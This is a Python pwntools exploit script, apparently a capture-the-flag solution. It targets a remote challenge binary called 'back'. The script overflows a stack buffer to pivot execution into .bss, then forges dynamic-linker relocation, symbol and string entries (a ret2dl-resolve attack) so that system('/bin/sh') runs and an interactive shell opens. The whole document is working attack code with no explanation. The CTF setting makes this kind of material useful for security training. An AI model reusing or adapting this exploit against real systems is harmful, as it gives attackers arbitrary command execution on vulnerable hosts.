from pwn import *
#io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})

io = remote("challenges.ctfd.io",30096)

#io = remote("localhost",2000)
read_got =0x404018
retur = 0x0000000000401122
read_code = 0x40112a
bss = 0x4040c0+0xa00
 
base = 0x404040+0xa00
rel_plt = (base -0x0000000000400420 )  / 24
dynsym = (base + 24 - 0x0000000000400328 ) / 0x18
dynstr = (base + 24 +32 -0x0000000000400388)

payload = ("a"*0x80+p64(bss) +p64(read_code) + p64(retur)).ljust(0x150,"a")


#gdb.attach(io)
io.send(payload)

push = 0x401020

pop_rdi_ret = 0x00000000004011ab
binsh =0x404b50

pop_rsi = 0x00000000004011a9

ret = 0x0000000000401016

payload = p64(read_got) + p64(dynsym <<32 | 0x7) + p64(0x46f0)
payload+= p64(dynstr) +p64(0)*3 + "system\0" + p32(0)*2  + "/bin/sh\0"
payload += "\x00" + "a"*56 + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi) + p64(0)*2+ p64(ret)
payload += p64(push) + p64(rel_plt) + p64(0)+ "/bin/sh\0"*10

io.send(payload)
io.interactive()
